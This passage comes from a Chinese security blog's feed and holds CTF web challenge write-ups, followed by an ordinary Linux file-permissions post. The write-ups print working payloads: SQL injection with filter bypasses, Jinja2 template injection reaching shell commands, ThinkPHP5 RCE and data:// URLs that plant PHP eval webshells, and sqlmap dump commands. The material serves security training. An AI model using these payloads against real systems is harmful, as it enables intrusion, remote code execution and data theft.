}审计源码是一个UserInfo类，类对象有三个属性：name,age,blog。其余的部分有两个函数特殊些，一个get，一个isValidBlog。get方法通过curl发送请求（curl是一个利用url语法工作的传输工具，此例中的使用，即获得指定url的页面内容。详细内容，请自行查阅补充），且并未对参数url进行过滤，这种不对用户可控参数过滤的，我们就要重点对待下。isValidBlog函数是对blog参数进行的正则匹配，猜测对用户的输入格式进行了一定的限制。（getBlogContents函数调用了get函数，同样需要关注。）发现其中Get()方法并没有对获取过来的url进行任何的过滤，所以这里存在SSRF(服务端请求伪造)漏洞。对于有登录，有注册的例题，我们要习惯性的尝试下弱口令。结果全部弹窗提示“login failed”，换注册窗口，注册登录。整个页面除了蓝色用户名可以点击之外，没什么有价值的东西。查看下源码你会发现，最下面是个iframe。iframe的内容通过data伪协议获取，此处data协议的使用格式为：    data:text/html;base64,<base64编码的HTML代码>如果我们想办法让data协议后面接上flag.php的内容，是不是就能达到显示目的了。同时也来了两个问题：一，flag文件的路径并不清楚，通过扫描，我们只晓得它和主页面在同一目录下。二、如何将内容添加到data协议后面。    /view.php?no=1整个页面还剩一个点，就是这个no参数：把它换成0或者换成2，页面返回全部报错。但获得了重要信息，路径。确定一点flag文件路径为：/var/www/html/flag.php。存在sql注入    /view.php?no=1 and 1=1 #order by 4 # 正常显示， order by 5 # 页面报错，判断有四列    /view.php?no=1 order by 4 #    /view.php?no=1 order by 5 #判断显示位,返回no hack ~_~，说明有过滤    /view.php?no=1 union select 1,2,3,4 #使用内联注释绕过。union/**/select绕过，发现username处显示出来了2，其余地方为反序列化失败。    /view.php?no=-6 union/**/select 1,2,3,4#    Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31所以先在username处将数据带出，得到用户是root@localhost ，database为fakebook    /view.php?no=-6 union/**/select 1,user(),3,4#    /view.php?no=-6 union/**/select 1,database(),3,4#先抛开数据库名fakebook不说，这个root用户着实吓了一跳，权限之高，亮瞎狗眼。mysql中的load_file函数，允许访问系统文件，并将内容以字符串形式返回，不过需要的权限很高，且函数参数要求文件的绝对路径。这巧了不是，条件全都有。payload:    /view.php?no=-6/**/union/**/select 1,load_file("/var/www/html/flag.php"),3,4查看源码获得flag但会发现，前面搜集的好多点全部没用到，尤其是那个严重可疑的iframe，继续尝试注入。不用load_file，继续注入下去。现在已经拿到了数据库名：fakebook，接下来拿表名：爆表名，得到表名为users    /view.php?no=-6 union/**/select 1,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA="fakebook"),3,4#爆列名，得到列名为no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 。明显no，username，passwd为账号基本信息，后面有几个未知字段，猜测是系统变量。    /view.php?no=-6 union/**/select 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users'),3,4#我们知道最开始注册的no为1，username和passwd也都知道是什么，唯独data字段的信息不明确，拿出来看看吧。    /view.php?no=-6 union/**/select 1,group_concat(username,passwd,data),3,4 from users where no=1#爆字段，结果是个序列化后的UserInfo对象，这和我们最开始得到的那个备份文件契合了。        O:8:"UserInfo":3:{s:4:"name";s:9:"123123123";s:3:"age";i:12;s:4:"blog";s:20:"http://123123123.com";} 接下来的东西，我认为需要猜。最开始时的用户页面no=1时，页面返回用户的用户名、密码、博客之类的消息。毫无疑问，页面是根据users表中no=1的这条数据，渲染的页面。因为回显，我们只证明了查询语句的第二个字段是username。其余三个字段并不明确，但我们可以猜测，应该和数据库表中的字段顺序相似。第四个字段应该就是data，而我们现在有一个现成的data数据，大概的思路为，我们输入的信息被保存为序列化，读取的时候会从数据库中取出并反序列化，然后显示在blog界面。 、function get($url)获取的blog连接，如果连接失败就404，否则读取文件信息。所以我们可以通过反序列化来实现ssrf读取任意文件，构造我们想要的路径，然后为了绕过正则，不从注册登录的地方下手，直接人为构造联合查询返回语句，data字段在第四个位置。我们构造序列化的UserInfo实例，blog内使用file:///读取服务器端flag.php的文本内容    /view.php?no=-6/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'     用file伪协议读取flag内容交给blog参数，然后你再查看源码，iframe的src就发生了变化，base64解码后得到flag值写在后面，因为手工sql注入不是特别的熟练，所以在此记录一下：    1.爆数据库： group_concat(schema_name) from information_schema.schemata    2.表名 group_concat(table_name) from information_schema.tables where table_schema="前面查出来的"    3.字段 group_concat(column_name) from information_schema.columns where table_schema="前面查出来的"    4.内容 group_concat(xxx) from 表名.字段绕过union select 过滤方法：    1./**/ union /**/ select    2.un<>ion sel<>ect    3. %55NiOn  %53eLEct]]></content>
      
      
      <categories>
          
          <category> CTF-WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 web进阶题 1-10</title>
      <link href="2020/08/03/2020-08-03-CTF_world_web_advance/"/>
      <url>2020/08/03/2020-08-03-CTF_world_web_advance/</url>
      
        <content type="html"><![CDATA[常用工具：firefox:浏览器burpsuite：Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。中国菜刀:是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！ThinkPhp5框架：ThinkPHP是一个快速、简单的基于MVC和面向对象的轻量级PHP开发框架sqlmap: SQLMap是一款开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞获取数据库服务器的权限。它具有功能强大的检测引擎，可以针对许多不同类型的数据库进行渗透测试的功能特性，包括获取数据库中存储的数据、访问底层文件系统甚至可以通过外带数据连接的方式执行操作系统命令。1. baby_web2. Training-WWW-Robots3. unserialize34. Web_python_template_injection5. php_rce6. Web_php_include7. supersqli8. ics-069. warmup10. NewsCenter## baby_web题目：想想初始页面是哪个php初始页面应该是index.php，访问查看包，在响应头中找到FLAG：flag{very_baby_web}## Training-WWW-Robots直接查看robots.txt    User-agent: *    Disallow: /fl0g.php    User-agent: Yandex    Disallow: *打开fl0g.php，发现cyberpeace{ea98e5e21c4fdb22dd034856aecea170}## unserialize3题目    class xctf{    public $flag = '111';    public function __wakeup(){    exit('bad requests');    }    ?code=代码审计走起，最重要的是这一个函数function __wakeup()，配合题目unserialize想到PHP的序列化和反序列化__wakeup()函数用法:wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用__wakeup()方法。首先实例化xctf类并对其使用序列化（这里就实例化xctf类为对象test）    <?php    class xctf{                      //定义一个名为xctf的类    public $flag = '111';            //定义一个公有的类属性$flag，值为111    public function __wakeup(){      //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本    exit('bad requests');    }    }    $test = new xctf();           //使用new运算符来实例化该类（xctf）的对象为test    echo(serialize($test));       //输出被序列化的对象（test）    ?>执行结果    O:4:"xctf":1:{s:4:"flag";s:3:"111";}我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：    O:4:"xctf":2:{s:4:"flag";s:3:"111";}构造payload 访问得到flag    /?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}## Web_python_template_injection模板注入例：    def test():        code=request.args.get('id')        html='''<h3>%s</h3>'''%(code)        return render_template_string(html)这段代码中的`html`就是一个简单的模板文件，当开发者想要这个模板对应的样式时，可以直接用`render_template_string`方法来调用这个模板，从而直接把这个样式渲染出来。而模板注入，就是指**将一串指令代替变量传入模板中让它执行**，以这段代码为例，我们在传入`code`值时，可以用`{{}}`符号来包裹一系列代码，以此替代本应是参数的`id`：    http://..../?id={{代码}}首先，先测试一下是不是确实能注入，构造一个简单的测试url:    http://http://220.249.52.133:55212/{{7*7}}    URL http://http://220.249.52.133:55212//49 notfound`/49`的存在说明`7*7`这条指令被忠实地执行了。接下来，开始想办法编代码拿到服务器的控制台权限。首先，题目告诉我们这是一个python注入问题，那么脚本肯定也是python的，思考怎样用python语句获取控制台权限：想到了`os.system`和`os.popen`([参考资料](https://blog.csdn.net/sxingming/article/details/52071514)),这两句前者返回**退出状态码**,后者**以file形式**返回**输出内容**,我们想要的是内容，所所以选择`os.popen`。知道了要用这一句，那么我要怎么找到这一句呢？python给我们提供了完整的寻找链([参考资料](https://www.cnblogs.com/tr1ple/p/9415641.html))：    __class__：返回对象所属的类    __mro__：返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。    __base__：返回该类所继承的基类    //__base__和__mro__都是用来寻找基类的    __subclasses__：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表    __init__：类的初始化方法    __globals__：对包含函数全局变量的字典的引用找到当前变量所在的类    http://220.249.52.133:55212/%7B%7B''.__class__%7D%7D    URL http://220.249.52.133:55212/<type 'str'> not found从这个类找到它的基类    http://220.249.52.133:55212/%7B%7B''.__class__.__mro__%7D%7D    URL http://220.249.52.133:55212/(<type 'str'>, <type 'basestring'>, <type 'object'>) not found然后，通过基类来找其中任意一个基类的引用列表    http://220.249.52.133:55212/%7B%7B''.__class__.__mro__[2].__subclasses__()%7D%7D这里有个小细节，`__mro__[]`中括号里填谁其实区别都不大，这些基类引用的东西都一样。服务器回复了很长的一个列表    URL http://220.249.52.133:55212/[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, ...] not found从其中可以找到我们想要的`os`所在的`site._Printer`类，它在列表的第七十二位,即`__subclasses__()[71]`通过`__subclasses__()[71].__init__.__globals__['os'].popen('命令行语句').read()`来调用服务器的控制台并显示，这下我们就可以随便用控制台输出了。    http://220.249.52.133:55212/%7B%7B''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()%7D%7D    URL http://220.249.52.133:55212/fl4g index.py not found从这里我们看到，flag存在一个叫`fl4g`的无后缀文件里，再构造一个payload，用`cat`读一下内容：    http://220.249.52.133:55212/%7B%7B''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat%20fl4g').read()%7D%7D    URL http://220.249.52.133:55212/ctf{f22b6844-5169-4054-b2a0-d95b9361cb57} not found其他常用payload    ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')    命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps    ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')    ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()关于payload怎么构造，具体可参考原理 [关于python魔术方法payload](https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/python/)exp [FlaskJinja2 SQL注入绕过姿势](https://www.cesafe.com/html/6461.html)[Python中可以利用的方法和模块](https://blog.csdn.net/hxhxhxhxx/article/details/107621224)## php_rceThinkPHP5.x RCE 漏洞分析与复现 https://blog.csdn.net/qq_40884727/article/details/101452478构造几个特殊的url即可复现漏洞。查看phpinfoindex.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1执行系统命令index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令 (如 dir whoami)查看根目录下文件，找到flagindex.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20/查找磁盘所有含有flag的文件index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name flag执行catflag命令查看flagindex.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag写入脚本index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=test.php&vars[1][]=<?php echo'ok';?>写入shellindex.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=test.php&vars[1][]=%3C?php%20echo%20%27ok%27;?%3Eindex.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zxc1.php&vars[1][]=%3C?php%20@eval($_POST[shell]);?%3E## Web_php_include    <?php    show_source(__FILE__);    echo $_GET['hello'];    $page=$_GET['page'];    while (strstr($page, "php://")) {        $page=str_replace("php://", "", $page);    }    include($page);    ?>通过代码审计可以知道，存在文件包含漏洞，并且对伪协议php://进行了过滤。关于php伪协议可以查看这三篇文章[php 伪协议探究](https://www.cnblogs.com/shellr00t/p/7638034.html)[php伪协议实现命令执行的七种姿势](https://www.freebuf.com/column/148886.html)[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)strstr() 函数：查找字符串首次出现的位置。返回字符串剩余部分    strstr(string,search,before_search)     string 必需。规定被搜索的字符串。    search 必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。    before_search 可选。一个默认值为 "false" 的布尔值。如果设置为 "true"，它将返回 search 参数第一次出现之前的字符串部分。str_replace() 函数：以其他字符替换字符串中的一些字符(区分大小写)法一：data://伪协议执行命令利用进行绕过使用方法:data://text/plain;base64,xxxx(base64编码后的数据)利用御见后台扫描![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/2020726-54703.jpg)发现根目录下存在phpinfo,观察phpinfo发现:![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/1855476-20200319181710874-1551409939.png)这两个都为on，所以我们就可以使用data://伪协议payload:    ?page=data://text/plain,<?php system("ls")?>    ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=    #base64编码    ?page=data:text/plain,<?php system("ls")?>    ?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=    #base64编码发现有以下文件 fl4gisisish3r3.php index.php phpinfo.php         ?page=data://text/plain,<?php system("cat fl4gisisish3r3.php")?>使用该命令获取的flag被隐藏了，直接在web界面找不到，可以通过查看网页源代码查看到flag或者payload,data://伪协议传木马,菜刀连接即可    ?page=data://text/plain,<?php eval($_POST[c]); ?>    ?page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbY10pOyA/Pg== #base64编码法二：利用hello参数，hello接收到数据直接输出，所以就可以构造如下payload：?page=http://127.0.0.1/index.php/?hello=<php? system("ls")?>但是执行不通过，不知道原因，但由于phpinfo中 ![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/2020726-44259.jpg)尝试短标签，可以实现    ?page=http://127.0.0.1/index.php/?hello=<?=system("ls")?>    ?page=http://127.0.0.1/index.php/?hello=<?system("ls")?>    ?page=http://127.0.0.1/index.php/?hello=<?show_source("fl4gisisish3r3.php");?>法三：绕过代码的php://伪协议的过滤，利用大小写绕过尝试用 Php://input + [POST DATA]    ?page=Php://input     [POST DATA部分] <?php system("ls");?>执行不通过，尝试Php://filter    ?page=Php://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php对得到的结果进行base64解码即可法四：数据库写马利用御见后台扫描![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/2020726-54703.jpg)发现根目录下存在phpmyadmin后台，进入后台测试弱口令，账户为root密码为空查询是否可以写入shell，数据库执行这条命令查看secure_file_priv是否为空，为空则可以写数据 如果是null不能写    SHOW VARIABLES LIKE "secure_file_priv"![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/2020726-82002.jpg)可以写入，sql执行如下语句linux默认tmp是可写目录 试试写入一句话马    select "<?php eval(@$_POST['c']); ?>"into outfile '/tmp/shell.php'菜刀连接,获得shell，然后就可以去获取flag了http://220.249.52.133:33548/?page=/tmp/shell.phphttp://220.249.52.133:33548/?page=../../tmp/shell.php## supersqli参考自 https://zhuanlan.zhihu.com/p/78989602docker容器：https://link.zhihu.com/?target=https%3A//github.com/glzjin/qwb_2019_supersqli注入过程：(1)探测有无注入    1'   报错    1'#  正常且为True    1' and 1=1#  正常且为True    1' and 1=2#  正常且为False    可以得知存在注入，并且参数使用单引号闭合。(2)尝试获取列数    1' order by 1 #    1' order by 2 #    1' order by 3 #     报错，column列数为2(3)尝试获取数据库表字段等基本信息    1' union select 1,2 #    报错，return preg_match("/select|update|delete|drop|insert|where|\./i",$inject); 发现select等关键词过滤报错注入：报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。常用的三种报错注入方式分别是：floor()、updatexml()、extractvalue()。具体可以参考文章[报错注入](https://blog.csdn.net/silence1_/article/details/90812612)    这里过滤了select，也没有发现绕过select的地方(大小写，加注释)。于是可以考虑一下报错注入，这里限制了update，那么就不用updatexml，用extractvalue    用户名    1' and (extractvalue(1,concat(0x7e,user(),0x7e)));#    error 1105 : XPATH syntax error: '~root@localhost~'    数据库    1' and (extractvalue(1,concat(0x7e,database(),0x7e)));#    error 1105 : XPATH syntax error: '~supersqli~'    版本    1' and (extractvalue(1,concat(0x7e,version(),0x7e)));#    error 1105 : XPATH syntax error: '~10.3.15-MariaDB~'堆叠注入：就是一堆 sql 语句(多条)一起执行    1';show tables;#    堆叠注入，获得两张表 "1919810931114514"、"words"    1';show columns from `words`;#    1';show columns from `1919810931114514`;#    1';desc `words`;#    1';desc `1919810931114514`;#    分别查询字段,发现flag在表1919810931114514中    虽然过滤了select和where等，但是可以通过执行多语句，将要执行的sql语句进行拼接，这样就可以将过滤的sql关键字拆分绕过检测。    这里@是定义一个用户自定义变量的意思，PREPARE是预处理，这里预处理语句必须大写，格式就是PREPARE sql_query from @sql_query;execute sql_query;    1';set @sql=concat('s','elect database()');PREPARE sql_query FROM @sql;EXECUTE sql_query;#    1';use information_schema;set @sql=concat('s','elect column_name from columns wher','e table_name="1919810931114514"');PREPARE sql_query FROM @sql;EXECUTE sql_query;#    1';use supersqli;set @sql=concat('s','elect flag from `1919810931114514`');PREPARE sql_query FROM @sql;EXECUTE sql_query;#    1';set @sql=concat('s','elect * from `words`');PREPARE sql_query FROM @sql;EXECUTE sql_query;#另外一种思路：    虽然过滤了一些关键词，但是网站默认查询的表结构，和words表结构一致，猜测就是words表，inject值应该赋给了id。而且并没有过滤rename和alter等关键词，我们可以改变表的结构。    我们将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了。    1';alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#    1' or 1=1#知识点总结    1. MySQL表名为纯数字时(表名和保留字冲突时也是加反引号)，要加反引号：show columns from `1919810931114514`    2. MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT，也就是预处理语句    3. 字符拼接函数可以考虑用来绕过关键字检查## ics-06题目云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。思路打开题目发现是一个工控云管理系统依次点击左侧的导航菜单，发现只有报表中心可以点击，其实题目中也有提示。点开后发现是一个报表查询页面选择日期范围什么也查不到，原本以为这里的日期查询可能存在注入什么的，尝试后证明我想多了，这里只写了各前端，根本没有后端。观察url链接，发现了id参数，利用点可能在这里，使用burp爆破下试试id爆破 利用intruder 配置Payload Sets:Numbers 1-10000发现到2333时数据包长度和其他的不同，将id的值改为2333获得flag。## warmup打开页面，一个滑稽，查看源码，得到source.php，输入得到源码：    <?php        highlight_file(__FILE__);        class emmm        {            public static function checkFile(&$page)            {                $whitelist = ["source"=>"source.php","hint"=>"hint.php"];                if (! isset($page) || !is_string($page)) {                    echo "you can't see it";                    return false;                }                if (in_array($page, $whitelist)) {                    return true;                }                $_page = mb_substr(                    $page,                    0,                    mb_strpos($page . '?', '?')                );                if (in_array($_page, $whitelist)) {                    return true;                }                $_page = urldecode($page);                $_page = mb_substr(                    $_page,                    0,                    mb_strpos($_page . '?', '?')                );                if (in_array($_page, $whitelist)) {                    return true;                }                echo "you can't see it";                return false;            }        }        if (! empty($_REQUEST['file'])            && is_string($_REQUEST['file'])            && emmm::checkFile($_REQUEST['file'])        ) {            include $_REQUEST['file'];            exit;        } else {            echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";        }      ?>发现有个hint.php，进去看一看，得到一句话    flag not here, and flag in ffffllllaaaagggg猜测flag就在ffffllllaaaagggg里面进行代码审计    1.定义了一个白名单：source.php和hint.php，判断$page是否为空、是否为字符串;    函数：empty() 用于检查一个变量是否为空。    2.判断$page是否在白名单里，若存在返回true；    函数：in_array 搜索数组中是否存在指定的值。    3.考虑到page有参数的情况，$_page是取出$page问号前的东西，然后再判断$_page是否在白名单里，若存在则返回true；    函数：mb_substr() 返回字符串的一部分    例如：        <?php        echo mb_substr("菜鸟教程", 0, 2);        // 输出：菜鸟        ?>    函数：mb_strpos() 返回要查找的字符串在别一个字符串中首次出现的位置。    例如：        <?php            $str = 'http://www.feiniaomy.com';            echo mb_strpos($str,'niao');        // 输出结果：14        ?>    4.如果上一步判断失败，则又考虑了url编码的问题，因为url在传入以后服务器会自动进行一次解码。因此传入二次编码后的内容，就可以使checkfile返回true。分析完代码后就可以开始构造payload了其中由于我们不知道ffffllllaaaagggg文件的具体位置，只能依次增加../，最终在../../../../../../ffffllllaaaagggg找到。传递一个参数file=source.php?/../../../../../../ffffllllaaaagggg，目录穿越，第二次验证时就通过。当然也可以把?进行两次url编码，所以最后的payload为file=source.php%253f/../../../../../../ffffllllaaaagggg。首先，第一次验证肯定过不了，第二次截取完也过不了，第三次，经过url解码之后，我们构造的payload就变成了source.php?/../../../../../../ffffllllaaaagggg，很显然，它是截取?前面的进行校验，我们这的source.php在白名单中，所以返回true，最后通过目录穿越的到ffffllllaaaagggg里面的内容，也就是flag。按照上述思路，下面两个payload都可以，只不过返回true的地方不一样，一个是第二次验证，一个是第三次验证。    source.php/?file=source.php?/../../../../../../../../ffffllllaaaagggg    source.php/?file=source.php%253f/../../../../../../../../ffffllllaaaagggg最后说一下，这题是一个PhpMyadmin4.81文件包含的CVE，感兴趣的可以参考[phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）](https://www.cnblogs.com/leixiao-/p/10265150.html)## NewsCenter搜索框 输入关键词搜索 发现是post请求方法一：sqlmap自动化注入利用BP抓包，将post请求保存为NewsCenter.txt(当然也可以直接访问)    POST / HTTP/1.1    Host: 220.249.52.133:38755    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2    Accept-Encoding: gzip, deflate    Content-Type: application/x-www-form-urlencoded    Content-Length: 10    Origin: http://220.249.52.133:38755    Connection: close    Referer: http://220.249.52.133:38755/    Cookie: PHPSESSID=el9cc1r87tnv275eucibrioao3    Upgrade-Insecure-Requests: 1    search=123使用sqlmap进行自动注入    sqlmap -r NewsCenter.txt --dbs    sqlmap -u http://220.249.52.133:38755 --data "search=123" --dbs发现两张表    information_schema    news发现存在POST注入，继续深入~    sqlmap -r NewsCenter.txt -D news --tables    sqlmap -r NewsCenter.txt -D news -T secret_table  --columns    sqlmap -r NewsCenter.txt -D news -T secret_table -C "id,fl4g" --dump也可以一次性把new数据库内的内容全部爆出来    sqlmap -r NewsCenter.txt -D news --dump方法二：手工注入流程：    1、查看网页结构、请求、cookie等，确认不存在答案和提示性信息；    2、网页中有且只有一个表单字段,为post请求，猜测此为突破点；    3、输入查询条件后提交未有回显等特征，初步排除基本的客户端注入；    4、输入单引号页面报错，猜测为SQL注入，寻找注入点，可通过注释闭合单引号进行UNION注入，一步步得出数据库库名、库表、字段和数据。sql单行注释 ： -- （--后跟有一个空格） #闭合语句形如     xxxx’ xxxx ; --    xxxx’ xxxx #具体操作：    判断注入点，输入 123',页面错误，输入 123' #，正常显示，所以搜索文章处有注入点    判断列数， 123' order by 3 # 正常显示， order by 4 # 页面报错，判断有三列    判断显示位 123' union select 1,2,3 #，显示位在 2 和 3 上    爆表 123' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #    注：group_concat函数，能将相同的行组合起来。        爆字段 123' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='secret_table' #        爆值 123' union select 1,group_concat(fl4g),3 from secret_table #]]></content>
      
      
      <categories>
          
          <category> CTF-WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux目录文件权限</title>
      <link href="2020/07/30/2020-07-30-linux_rwx/"/>
      <url>2020/07/30/2020-07-30-linux_rwx/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux-权限位"><a href="#Linux-权限位" class="headerlink" title="Linux 权限位"></a>Linux 权限位</h2><p>在Linux中，有5种权限，分别是r、w、x、s、t。</p><ul><li><p>可读权限：r</p><p>  用八进制表示：4<br>  对于文件，可以对读取文件里的内容；对于目录，可以列出目录下的内容</p></li><li><p>可写权限：w</p><p>  用八进制表示：2<br>  对于文件，可以对文件进行更改；对于目录，可以在目录下创建文件或目录</p></li><li><p>可执行权限：x</p><p>  用八进制表示：1<br>  对于文件，可以执行该文件（脚本或命令）；对于目录，可以cd进入该目录</p></li></ul><p>下面三个特殊权限位，具体可查看<a href="https://www.cnblogs.com/liuhedong/p/10739718.html">Linux 权限位详解</a></p><ul><li><p>Setuid：s（Set User ID）</p></li><li><p>Setgid：s（Set Group ID）</p></li><li><p>粘滞位：t</p></li></ul><h2 id="linux权限表"><a href="#linux权限表" class="headerlink" title="linux权限表"></a>linux权限表</h2><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/1568045-20190420014404372-1216036035.png"></p><h2 id="查看文件的权限-ls-l-输出详解"><a href="#查看文件的权限-ls-l-输出详解" class="headerlink" title="查看文件的权限 ls -l 输出详解"></a>查看文件的权限 ls -l 输出详解</h2><p>例如：</p><pre><code>lrwxrwxrwx. 1 root root 7 Oct 3 02:33 bin -&gt; usr/bin第一个字符的含义：    -：常规文件    b：块特殊文件    c：字符特殊文件    C：高性能（”连续数据“）文件    d：目录    D：门(Solaris 2.5及以上版本)    l：符号链接    M：离线（”前已“）文件（Cray DMF）    n：网络专用文件（HP-UX）    p：FIFO（命名管道）    P：断开（Solaros 10及以上）    s：套接字    ?：其他文件第二个字符的含义：    r：属主的读权限第三个字符的含义：    w：属主的写权限第四个字符的含义：    x：属主的执行权限    S：设置了SUID，没有执行权限    s：设置了SUID，具有执行权限第五个字符的含义：    r：属组的读权限第六个字符的含义：    w：属组的写权限第七个字符的含义：    x：属组执行权限    S：设置了SGID，没有执行权限    s：设置了SGID，具有执行权限第八个字符的含义：    r：其他人的读权限第九个字符的含义：    w：其他人的写权限第十个字符的含义：    x：其他人的执行权限    T：设置了粘滞位，没有执行权限    t：设置了粘滞位，具有执行权限第十一个字符的含义：    .：没有任何其他替代访问方法的SELinux安全上下文（没有设置ACL）    +：具有任何其他组合访问方法的SELinux安全上下文（设置了ACL）第十二个字符的含义：该文件的硬链接数量第十三个字符的含义：该文件的属主第十四个字符的含义：该文件的属组第十五个字符的含义：该文件的大小第十六到第十八个字符的含义：最后一次修改的时间第十九个字符的含义：文件或目录的名称第二十个字符的含义：链接符号第二十一个字符的含义：链接文件的源文件</code></pre><h2 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h2><p>使用chmod和数字改变文件或目录的访问权限</p><p>文件和目录的权限表示，是用rwx这三个字符来代表所有者、用户组和其他用户的权限。有时候，字符似乎过于麻烦，因此还有另外一种方法是以数字来表示权限，而且仅需三个数字。</p><pre><code>r: 对应数值4w: 对应数值2x：对应数值1－：对应数值0</code></pre><p>下面举几个例子：</p><pre><code>-rwx------:等于数字表示700。-rwxr--r--:等于数字表示744。-rw-rw-r-x:等于数字表示665。drwx--x--x:等于数字表示711。drwx------:等于数字表示700。</code></pre><p>命令格式：</p><pre><code>chmod 权限数字 文件名</code></pre><p>例如</p><pre><code>给scan_record.js赋予所有人读写和执行的权限chmod 777 scan_record.js仅把fileA目录的权限设置为700chmod 700 /mnt/fileA 将整个/mnt/fileA目录与其中的文件和子目录的权限都设置为744(使用参数－R表示启动递归处理)chmod -R 744 /mnt/fileA</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入思路方法</title>
      <link href="2020/07/27/2020-07-27-sql_injection_method/"/>
      <url>2020/07/27/2020-07-27-sql_injection_method/</url>
      
